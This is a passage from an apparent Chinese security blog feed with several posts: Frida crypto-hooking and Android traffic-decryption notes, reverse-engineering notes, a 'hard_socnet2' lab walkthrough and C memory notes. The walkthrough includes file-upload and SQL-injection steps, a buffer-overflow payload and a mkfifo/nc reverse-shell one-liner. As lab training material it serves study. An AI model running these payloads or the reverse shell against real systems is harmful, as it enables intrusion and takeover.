language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toResult</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> doFinal result`</span>, result)</span><br><span class="line">          <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">Signature</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="params"><span class="string">&#x27;java.security.Signature&#x27;</span></span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">let</span> overloads_update = <span class="title class_">Signature</span>.<span class="property">update</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_update) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toAll</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> update data`</span>, <span class="variable language_">arguments</span>[<span class="number">0</span>])</span><br><span class="line">          <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">update</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">let</span> overloads_sign = <span class="title class_">Signature</span>.<span class="property">sign</span>.<span class="property">overloads</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> overload <span class="keyword">of</span> overloads_sign) &#123;</span><br><span class="line">        overload.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> algorithm = <span class="variable language_">this</span>.<span class="title function_">getAlgorithm</span>()</span><br><span class="line">          <span class="title function_">showDivider</span>(algorithm)</span><br><span class="line">          <span class="title function_">showStacks</span>(algorithm)</span><br><span class="line">          <span class="keyword">const</span> result = <span class="variable language_">this</span>.<span class="title function_">sign</span>()</span><br><span class="line">          <span class="title class_">Encode</span>.<span class="title function_">toResult</span>(<span class="string">`<span class="subst">$&#123;algorithm&#125;</span> sign result`</span>, result)</span><br><span class="line">          <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">sign</span>(...<span class="variable language_">arguments</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>

<p>&#x2F;data&#x2F;data 目录下就是解压的</p>
<p>package</p>
<h3 id="请求内容和响应内容加密"><a href="#请求内容和响应内容加密" class="headerlink" title="请求内容和响应内容加密"></a>请求内容和响应内容加密</h3><p>sign和返回值加密</p>
<p>cmm（4.2.0）</p>
<p>算法助手的使用（xposed选系统框架后要重启、夜神模拟器4.4)</p>
<p>Fundex脱壳，360加固就是脱不了</p>
<ul>
<li>找调用就一层一层往上找</li>
<li>分析参数加密算法</li>
<li>分析返回的加密数据，还原即可</li>
<li>到现在Fundex就没脱壳成功过，安卓4不是还没支持xposed吗</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;data&quot;: &#123;</span><br><span class="line">		&quot;is_encrypt&quot;: true,</span><br><span class="line">		&quot;data&quot;: &quot;Cn/r/UgLbh6mpdV0wz1v7XaIrNBr3MI6+kY6+8QoYhd2HFA==&quot;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;errCode&quot;: 0,</span><br><span class="line">	&quot;rid&quot;: &quot;f0d9d0e7efae4af6e03343fab383d7d5&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h3 id="请求内容和返回值乱码"><a href="#请求内容和返回值乱码" class="headerlink" title="请求内容和返回值乱码"></a>请求内容和返回值乱码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zbw（3.1.5）</span><br><span class="line">aHR0cHM6Ly9tLmp5c2VkdS5jb20vYXBwLzkyNzMuaHRtbA==</span><br></pre></td></tr></table></figure>

<h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>1f8b gunzip</p>
<p>定义加密和解密脚本（base64加密-&gt;gunzip加密）</p>
<img src="/2024/07/31/Notes-Android/03.png" class title="This is an example image">

<img src="/2024/07/31/Notes-Android/05.png" class title="This is an example image">

<p>这里只解了gunzip的加密</p>
<img src="/2024/07/31/Notes-Android/04.png" class title="This is an example image">

<p>加密是自上而下的</p>
<img src="/2024/07/31/Notes-Android/06.png" class title="This is an example image">

<p>不确定哪个重载就往上翻</p>
<img src="/2024/07/31/Notes-Android/07.png" class title="This is an example image">

<p>遇事不决 ChatGPT</p>
<p>1、自吐脚本hook</p>
<p>2、特殊的encodeBase64Chunked 会以每行76个字符分块 \r\n</p>
<p>3、hook base64加密后的，打印发现也是每76个字符换行</p>
<p>4、hook用户名不存在</p>
<h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>服务器返回信息提示用户，必须解密，分析此解密过程（”用户名不存在”）</p>
<img src="/2024/07/31/Notes-Android/08.png" class title="This is an example image">

<h3 id="Charles-抓包问题汇总"><a href="#Charles-抓包问题汇总" class="headerlink" title="Charles 抓包问题汇总"></a>Charles 抓包问题汇总</h3><p>1、开启 Enabke SSL Proxy就是为了抓https的包，证书有问题的情况下，开启后无法访问</p>
<p>2、模拟器放到 &#x2F;storage&#x2F;emulated&#x2F;0&#x2F;Pictures&#x2F; 目录下</p>
<p>3、模拟器和主机重启，不行就再重启（postren走的是socket5）</p>
<p>4、真机每次切换证书可以试试重启，抓不到包换个浏览器，真机有时候只能用默认浏览器抓包，可能是证书安装有问题，其他浏览器不信任系统证书。但APP是可以抓包的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.jianshu.com/p/c546783ad284</span><br><span class="line">https://developer.android.com/ndk/guides/other_build_systems?hl=zh-cn</span><br><span class="line">https://www.cnblogs.com/burner/p/clang-fen-si-bu-bian-yimainc.html   编译博客也不错</span><br><span class="line">https://blog.csdn.net/qq_31865983/article/details/89402100    这个更加完整一点</span><br><span class="line">https://github.com/hugsy/gef</span><br><span class="line">https://www.likecs.com/show-204245381.html#sc=400</span><br><span class="line">Cortex-A7 常用汇编指令资料:</span><br><span class="line">https://www.cnblogs.com/iron2222/p/15640269.html</span><br><span class="line"></span><br><span class="line">gdb调试器快速上手教程</span><br><span class="line">https://blog.csdn.net/qq_45953886/article/details/127678876</span><br><span class="line"></span><br><span class="line">ARM官方汇编指令</span><br><span class="line">https://blog.csdn.net/oqqHuTu12345678/article/details/125683244</span><br><span class="line"></span><br><span class="line">ARM汇编基础 </span><br><span class="line">https://www.cnblogs.com/hilfloser/p/10516610.html</span><br><span class="line"></span><br><span class="line">ARM关于标志位影响详解</span><br><span class="line">https://blog.csdn.net/tabactivity/article/details/90407858</span><br><span class="line"></span><br><span class="line">ARM的九种寻址方式</span><br><span class="line">https://blog.csdn.net/qq_43743762/article/details/105056991</span><br><span class="line"></span><br><span class="line">### 5.编写第一个汇编程序</span><br><span class="line"></span><br><span class="line">&gt; ​	https://www.w3cschool.cn/c/c-file-io.html</span><br><span class="line"></span><br><span class="line">参考资料:https://softool.cn/read/arm_assembly_basic_aye/21010203.html</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/qq_41028985/article/details/119407917</span><br><span class="line"></span><br><span class="line">### 6.逆向C程序－数据类型</span><br><span class="line"></span><br><span class="line">&gt; 计算器：</span><br><span class="line">&gt; https://www.bangnishouji.com/tools/224457.html</span><br><span class="line"></span><br><span class="line">##### 1.32位浮点数表示方法:</span><br><span class="line"></span><br><span class="line">&gt; 二进制数怎么转化为浮点数？阶码又是怎么算出来的？</span><br><span class="line">&gt; https://zhidao.baidu.com/question/750285508423217012.html</span><br><span class="line"></span><br><span class="line">算法篇:ios和安卓通用</span><br><span class="line"></span><br><span class="line">参考连接:</span><br><span class="line">https://www.cnblogs.com/xiaxveliang/p/15004954.html</span><br><span class="line">https://blog.csdn.net/sinat_27933301/article/details/79538169</span><br><span class="line">https://www.cnblogs.com/DeeLMind/p/7581423.html</span><br><span class="line">https://www.bilibili.com/video/BV1aP411M7ug:强推</span><br><span class="line"></span><br><span class="line">https://www.bilibili.com/video/BV1V14y1T7LM</span><br><span class="line">https://blog.csdn.net/ZCShouCSDN/article/details/84675235</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>灰队</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Notes-Reverse</title>
    <url>/2024/07/03/Notes-Reverse/</url>
    <content><![CDATA[<p>写十种注入方式，demo，防护</p>
<p>IDA 定位 main 函数</p>
<p>强制解释为代码&#x2F;汇编，格式转换，n&#x2F;d键</p>
<p>IDA自动识别特征码函数，从系统lib提取，自动替换标识</p>
<ul>
<li>识别程序所用的lib</li>
<li>link -lib &#x2F;extract:build\intel\st_obj\printf.obj libc.lib      ;生成printf.obj</li>
<li>pcf printf.obj      ;生成printf.pat特征码文件</li>
<li>sigmake -n”vc6_printf” printf.pat printf.sig</li>
</ul>
<img src="/2024/07/03/Notes-Reverse/01.png" class title="This is an example image">

<p>三操作数值  </p>
<p>加一位等于乘于二？？</p>
<p>shl edx, 1</p>
<p>左移一位等于 2^ </p>
<h1 id="汇编优化"><a href="#汇编优化" class="headerlink" title="汇编优化"></a>汇编优化</h1><p>数学方面的，移位，高版本优化，优化模型</p>
<p>无符号、有符号数操作，后期补，加减乘除汇编代码</p>
<p>有种在熟悉常见的汇编表达的感觉，算是在补基础</p>
<h1 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h1><h2 id="静态分析："><a href="#静态分析：" class="headerlink" title="静态分析："></a>静态分析：</h2><p>C&#x2F;C++语言 -&gt; IDA Pro</p>
<p>Delphi -&gt; Delphi Decompiler</p>
<p>VB -&gt;</p>
<p>.NET(C#) -&gt; dnspy</p>
<p>Java -&gt; JUI  反编译</p>
<ul>
<li>API信息<ul>
<li>查看导入的API</li>
<li>看导出的API</li>
</ul>
</li>
<li>查看字符串信息</li>
</ul>
<h2 id="动态调试："><a href="#动态调试：" class="headerlink" title="动态调试："></a>动态调试：</h2><ul>
<li>创建DLL到临时目录，在创建文件和关闭文件汇编中间拷贝出生成的DLL（动态调试）</li>
</ul>
<h2 id="脱不掉壳-amp-调试软件打不开："><a href="#脱不掉壳-amp-调试软件打不开：" class="headerlink" title="脱不掉壳&amp;调试软件打不开："></a>脱不掉壳&amp;调试软件打不开：</h2><p>行为监控</p>
<ul>
<li>PCHunter</li>
<li>HRSword</li>
<li>火绒剑</li>
<li>Process Monitor</li>
</ul>
<p>检查壳和开发语言工具：<br>DIE_winxp_portable_3.01<br>exeinfope<br>PEID 0.95</p>
<h1 id="壳"><a href="#壳" class="headerlink" title="壳"></a>壳</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>壳 - 保护可执行文件（*.exe，*.dll）</p>
<p>压缩壳 - 减小可执行文件体积</p>
<p>加密壳 - 对抗逆向分析</p>
<h3 id="UPX压缩壳"><a href="#UPX压缩壳" class="headerlink" title="UPX压缩壳"></a>UPX压缩壳</h3><p>空节，sizeofImage</p>
<p>硬件断点、执行断点、内存断点</p>
<ul>
<li>识别是否加壳</li>
<li>找OEP（入口点）<ul>
<li>远跳，跨节</li>
<li>经验看所有的OEP，熟悉OEP，汇编无特征</li>
<li>ESP定律</li>
<li>API</li>
<li>单步跟踪（步过循环，只向跳转）</li>
</ul>
</li>
<li>dump</li>
<li>修复PE</li>
</ul>
<p>无对抗修表</p>
<p>手动dump一次</p>
<p>压缩壳实现（加壳部分）</p>
<p>压缩壳实现（壳代码部分）</p>
<p>脱壳</p>
]]></content>
      <categories>
        <category>x队</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Hard_socnet2</title>
    <url>/2022/11/12/hard-socnet2/</url>
    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/01.png" class title="This is an example image">



<p><strong>0x02 端口扫描</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.8</span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/02.png" class title="This is an example image">



<p><strong>0x03 服务识别</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.8 </span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/03.png" class title="This is an example image">

<p>得到基本信息，ubuntu，python2，apache</p>
<p><strong>0x04 服务识别</strong></p>
<p>访问 8000 端口，提示请求方式不支持</p>
<img src="/2022/11/12/hard-socnet2/04.png" class title="This is an example image">



<p>那就把八种请求方式全部试一遍。OPTIONS、HEAD、GET、POST、PUT、DELETE、TRACE、CONNECT。最终也只有POST请求返回信息有些许不同。</p>
<img src="/2022/11/12/hard-socnet2/05.png" class title="This is an example image">



<p>根据返回信息可以看到，提示 xml 解析报错，元素为空，猜测应该是服务端对外提供的 api，但具体调用格式还不清楚，先换个点，收集多点信息。</p>
<p><strong>0x05 后台图片上传 &amp; SQL注入</strong></p>
<p>访问默认 80 端口。有个 Pynch 系统，有个登录框和注册框，并且登录账号为邮箱。</p>
<img src="/2022/11/12/hard-socnet2/06.png" class title="This is an example image">



<p>真实渗透场景下需要收集目标相关的邮箱信息，再构造字典尝试登录。但由于目标在此目标没发现什么邮箱信息，那就直接注册个账号进去看看吧。</p>
<img src="/2022/11/12/hard-socnet2/07.png" class title="This is an example image">



<p>可以看到，此系统类似博客，每个人都可以留言，其中有 admin 账户的留言信息，表示后台已经运行了一个 monitor.py 监控程序，应该是伏笔，先记着。</p>
<p>经过后续测试发现两个突破口。第一个是个人信息的头像图片上传，存在任意文件上传。那就好办了，直接上蚁剑。</p>
<img src="/2022/11/12/hard-socnet2/08.png" class title="This is an example image">



<p>第二个是搜索框存在SQL注入。使用sqlmap注入尝试。</p>
<img src="/2022/11/12/hard-socnet2/09.png" class title="This is an example image">



<p>尝试读取用户表的信息。这里的信息是用于登录系统后台，登录admin后台并没有发现更多的功能点，暂时搁置。根据获得密码登录SSH，无果。</p>
<img src="/2022/11/12/hard-socnet2/10.png" class title="This is an example image">



<p><strong>0x06 尝试提权到 sudo 用户</strong></p>
<p>由于现在蚁剑获得了一个普通的权限，尝试提权。提权思路通常为：</p>
<ol>
<li><p>内核提权，uname -a</p>
<p>这个后面再讲，不符合当时靶机作者的思路。</p>
</li>
<li><p>sudo 提权</p>
<p>当前用户没有执行 sudo 相关程序的权限。</p>
</li>
<li><p>suid 权限配置不当，通过执行高权限用户文件得到高权限。</p>
<p>暂无找到 suid 相关的执行文件存在漏洞。</p>
</li>
</ol>
<p>来一波信息收集吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/11.png" class title="This is an example image">



<p>有 bash 权限的 socnet 存在主目录，并且其他组用户有查看权限，赶紧进去瞧瞧。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l /home</span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/12.png" class title="This is an example image">



<p>可以看到有个monitor.py，想起之前的在系统后台看到管理员说过，后台已经开启了 monitor ，查看是否开启。可以看到程序确实已经启动。</p>
<img src="/2022/11/12/hard-socnet2/13.png" class title="This is an example image">



<p>查看 monitor.py。这个文件有这么几个点：</p>
<ol>
<li>在 8000 端口开启了一个 XMLRPC 服务</li>
<li>随机生成一个1000到9999的数字，用于后续验证</li>
<li>定义了5个函数，其中四个为执行固定命令，一个为执行外部传输的指令，但前提是随机数正确</li>
</ol>
<img src="/2022/11/12/hard-socnet2/14.png" class title="This is an example image">



<p>另外 XMLRPC 就是通过解析 XML 格式的数据去执行功能点。</p>
<img src="/2022/11/12/hard-socnet2/15.png" class title="This is an example image">



<p>这样的话就有思路了，能否爆破出随机数，进而执行代码呢！</p>
<img src="/2022/11/12/hard-socnet2/16.png" class title="This is an example image">



<p>执行后爆破出来的随机数是 8793</p>
<img src="/2022/11/12/hard-socnet2/17.png" class title="This is an example image">



<p>修改代码，尝试进行命令执行。成功！</p>
<img src="/2022/11/12/hard-socnet2/18.png" class title="This is an example image">



<p>拿到了有 bash 权限的 socnet 用户，看看有没有相关提权漏洞，木的</p>
<img src="/2022/11/12/hard-socnet2/19.png" class title="This is an example image">



<p><strong>0x07 逆向工程 &amp; 动态调试 提权</strong></p>
<p><strong>提权</strong>的寻常思路不管用，那就继续信息收集吧。查看当前用户主目录下的文件信息，其中 monitor.py 为开启 XMLRPC 服务的文件，第一个文件 add_record，为 32 位的可执行程序，而且文件还有 setuid, setgid 属性。这就意味着，如果这个程序能够执行反弹 shell，那反弹的就是 root 权限。</p>
<img src="/2022/11/12/hard-socnet2/20.png" class title="This is an example image">



<p>第三个是 peda 目录，其实就是一个让 linux 自带的 <strong>GDB</strong> 显示得更友好，就是 GDB 的一个插件。而 GDB 是Linux下用来调试程序的，这一切仿佛都在暗示第一个可执行程序有问题。</p>
<img src="/2022/11/12/hard-socnet2/21.png" class title="This is an example image">



<p>说到可执行程序漏洞，往往就是栈溢出，原理就是输入异常数据，使得数据溢出到其他寄存器，导致可执行任意代码。</p>
<p>我们先来看看 add_record 这个程序的功能，运行试试。可以看到总共有五个输入点，Employee Name，Year worked，Salary，in trouble，Explain。</p>
<img src="/2022/11/12/hard-socnet2/22.png" class title="This is an example image">



<p>使用 gdb 进行运行调试。尝试在每个输入点注入相同字符，如果字符溢出到其他寄存器则存在缓冲区溢出漏洞。直接python打印A字符用于输入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;print(&#x27;A&#x27;*500)&quot;</span></span><br></pre></td></tr></table></figure>



<p>开始 gdb 运行调试（第一个输入点，正常退出）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb -q ./add_record  #安静模式启动调试程序</span><br><span class="line">r #正常执行程序</span><br><span class="line">AAA... #输入字符验证溢出</span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/23.png" class title="This is an example image">



<p>那就挨个输入点调试，在最后一个点触发了不正常退出。可以看到A字符被填充到其他寄存器里。</p>
<img src="/2022/11/12/hard-socnet2/24.png" class title="This is an example image">



<p>重点需要关注的是EIP寄存器，这是指令寄存器，放的是CPU下一条要执行指令的地址。可以看到这里EIP寄存器也被A字符填充了，如果我们能够控制shellcode的代码放在EIP中，那么CPU就会去执行。所以现在我们需要定位，测试时的500个字符中填充到EIP是哪部分。</p>
<p>这里用 gdb 内置的功能生成100字符，特点是每四个字符不同。便于我们定位EIP的填充字段。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">pattern create 100</span></span><br><span class="line">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&#x27;</span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/25.png" class title="This is an example image">



<p>之后执行 <code>pattern search</code> ，可以看到EIP对应的偏移为62，意味着从第63个字符开始就会进入EIP。</p>
<img src="/2022/11/12/hard-socnet2/26.png" class title="This is an example image">



<p>生成测试字符串，前62个字符为A，后面为BCDE，可以看到BCDE顺利被填充进EIP寄存器。这里需要说明一下，BCDE字符在内存中是倒过来存储的，存储为EDCB。即0x45444342对应的为EDCB，后续我们指定地址的时候要注意。</p>
<img src="/2022/11/12/hard-socnet2/27.png" class title="This is an example image">



<p>输入 <code>disas main</code> 进行汇编分析，其中@plt为系统内置的函数</p>
<img src="/2022/11/12/hard-socnet2/28.png" class title="This is an example image">



<p>有个 vuln 函数引起了注意，这名字明显不对头，而且这是在主程序中加载的，也就说默认执行程序时就已经执行了这函数，进去瞧瞧 <code>disas vuln</code>。</p>
<img src="/2022/11/12/hard-socnet2/29.png" class title="This is an example image">



<p>可以看到 vuln 函数中执行了 strcpy 内置函数，这函数已经披露过有缓冲区溢出漏洞，也就是说溢出后，<strong>我们可以指定任意内存地址跳转</strong>。</p>
<p>查看当前程序使用的函数列表 <code>info func</code>。其中 system 函数用于执行系统命令，setuid用于申请root权限，</p>
<img src="/2022/11/12/hard-socnet2/30.png" class title="This is an example image">



<p>还有个 backdoor 函数，这怎么看都很可疑，<code>disas backdoor</code>进去看看，system函数是在这里面调用的~</p>
<img src="/2022/11/12/hard-socnet2/31.png" class title="This is an example image">



<p>理一下思路，程序运行时自动加载 <code>vuln</code> 函数，其中调用了 <code>strcpy</code> ，导致其存在溢出漏洞，我们可以把 EIP 指向 <strong>backdoor</strong> 函数，因为里面执行了 setuid，和 system 函数。先尝试看看会执行成什么样，构造 payload，前62个字符为A，后续接上十六进制的 <code>backdoor</code> 地址，要倒着写。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2 -c &quot;import struct; print(&#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;,0x08048676))&quot;</span><br></pre></td></tr></table></figure>

<img src="/2022/11/12/hard-socnet2/32.png" class title="This is an example image">



<p>可以看到，在输入 <code>backdoor</code>函数里调用 system 自动执行了 &#x2F;bin&#x2F;bash，而且在之前还执行了 setuid 。因此，生成 payload，第一个参数a，第二个参数1，第三个参数1，第四个参数1，第五个参数为62个A加上 backdoor的地址。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2 -c &quot;import struct; print(&#x27;a\n1\n1\n1\n&#x27; + &#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;,0x08048676))&quot; &gt; payload</span><br></pre></td></tr></table></figure>



<p>执行 cat payload - | .&#x2F;add_record</p>
<img src="/2022/11/12/hard-socnet2/33.png" class title="This is an example image">



<p><strong>0x08 内核提权</strong></p>
<p>其实这台主机可以直接用 CVE-2021-3493 提权到 root，但因为靶机发布在此漏洞之前，作者应该是没想到这种情况。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">命令执行反弹shell</span></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.7 3333 &gt;/tmp/f</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过python优化交互的shell</span></span><br><span class="line">python -c &quot;import pty; pty,spawn(&#x27;/bin/bash) &lt;les$ python  -c &quot;import pty; pty,spawn(&#x27;/bin/bash)&quot;&#x27;)&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>Notes-C</title>
    <url>/2024/01/02/Notes-C/</url>
    <content><![CDATA[<h1 id="C语言内存地址"><a href="#C语言内存地址" class="headerlink" title="C语言内存地址"></a>C语言内存地址</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 命令行执行</span></span><br><span class="line"><span class="comment">// .obj文件为链接文件</span></span><br><span class="line"><span class="comment">// cl /c /W4 /P hello.c -编译</span></span><br><span class="line"><span class="comment">// link hello.obj -链接</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  <span class="comment">//环境变量寻找依赖，&quot;&quot;当前目录寻找</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">999</span>;    <span class="comment">// 0x000003e7      19ff2c(地址，全称0019ff2c) -&gt; E7 03 00 00 (值)</span></span><br><span class="line">    			   <span class="comment">// 999(十进制) -&gt; 3e7(十六进制)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello world!%p:%d\r\n&quot;</span>,&amp;n,n); <span class="comment">//打印内存地址</span></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>WinHex 打开内存文件</p>
<p>查找16进制：Alt+Ctrl+F<br>搜索下一个：F3</p>
<p>到特定的偏移地址，Seek Logical Address&#x2F;Go to Virtual Address</p>
<img src="/2024/01/02/Notes-C/01.png" class title="This is an example image">

<p>VC++6.0固定变量内存地址，最新版的VC是随机地址</p>
<p>VC98&#x2F;CRT&#x2F;SRC&#x2F;CRT0.C-&gt;mainCRTStartup</p>
<h1 id="内存存储机制"><a href="#内存存储机制" class="headerlink" title="内存存储机制"></a>内存存储机制</h1><h2 id="补码（整数和小数的表示）"><a href="#补码（整数和小数的表示）" class="headerlink" title="补码（整数和小数的表示）"></a>补码（整数和小数的表示）</h2><h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p>内存中存储的都是补码形式，先判断正负数，再对两者之间进行转换<br>比如：winHex里面的十六进制跟变量十进制之间的转换</p>
<p>二进制的 + - * &#x2F; 原理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  A - B</span><br><span class="line">= A + (0x100-B) - 0x100</span><br><span class="line">    B + ~B = ff</span><br><span class="line">    B + ~B + 1 = 0x100</span><br><span class="line">    ~B + 1 = 0x100 - B //求补运算</span><br><span class="line">= A + neg(B) - 0x100 //进位丢失     010进位10</span><br></pre></td></tr></table></figure>

<p>求补运算是一种运算<br>补码是一种编码<br>补码规定了数据的读写双方必须做到：<br>1、最高有效位是符号位，0表示正，1表示负<br>2、当数据是正数的时候，其余各种直接存储其数值<br>3、当数据为负数的时候，其余各种存储其求补后的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">    <span class="comment">// 110100</span></span><br><span class="line">    <span class="comment">// 0 0110100</span></span><br><span class="line">    <span class="comment">// 0011 0100</span></span><br><span class="line">    <span class="comment">// 3    4</span></span><br><span class="line">	<span class="type">int</span> n = <span class="number">52</span>;<span class="comment">// 34 00 00 00</span></span><br><span class="line">    <span class="comment">// 110100</span></span><br><span class="line">    <span class="comment">// 1 0110100</span></span><br><span class="line">    <span class="comment">// 1 1001011 + 1   取反+1</span></span><br><span class="line">    <span class="comment">// 1 1001100</span></span><br><span class="line">    <span class="comment">// 1100 1100</span></span><br><span class="line">    <span class="comment">// c   c</span></span><br><span class="line">    <span class="type">int</span> m = <span class="number">-52</span>;<span class="comment">// cc ff ff ff</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\r\n&quot;</span>,&amp;n);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>公式：补码&#x3D;反码+1</p>
<p>十进制整形在内存中的存储：</p>
<p>1、转化为二进制<br>2、正数则直接按照二进制转换为十六进制<br>3、负数则除符号位，取反+1，再转换为十六进制<br>4、按照内存4个字节，一个字节8位？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">计算 <span class="number">34</span>，<span class="number">-34</span></span><br><span class="line"><span class="comment">// 34</span></span><br><span class="line"><span class="comment">// 100010</span></span><br><span class="line"><span class="comment">// 0 0100010</span></span><br><span class="line"><span class="comment">// 0010 0010</span></span><br><span class="line"><span class="comment">// 2    2</span></span><br><span class="line">    =&gt; <span class="number">22</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="comment">// -34</span></span><br><span class="line"><span class="comment">// 100010</span></span><br><span class="line"><span class="comment">// 1 0100010</span></span><br><span class="line"><span class="comment">// 1 1011101 + 1</span></span><br><span class="line"><span class="comment">// 1 1011110</span></span><br><span class="line"><span class="comment">// 1101 1110</span></span><br><span class="line">   =&gt; de ff ff ff</span><br><span class="line">    </span><br><span class="line"><span class="number">0x86</span>单字节有符号数的十进制真值是什么？</span><br><span class="line"><span class="comment">// 就是求内存中十六进制表示是86的值，实际变量定义的十进制数是多少</span></span><br><span class="line"><span class="comment">// 1000 0110</span></span><br><span class="line"><span class="comment">// 1 0000110</span></span><br><span class="line"><span class="comment">// - 1111001 + 1         补码转化为正常二进制，也是除符号位外取反+1</span></span><br><span class="line"><span class="comment">// - 1111010</span></span><br><span class="line"><span class="comment">// - 0111 1010</span></span><br><span class="line"><span class="comment">// - 7    A</span></span><br><span class="line"><span class="comment">// - 7*16 + 10 = -122</span></span><br><span class="line">    </span><br><span class="line">定义变量为<span class="number">-122</span>，用winHex去寻找地址看是不是<span class="number">86</span></span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line"><span class="number">0x80</span>呢？</span><br><span class="line"><span 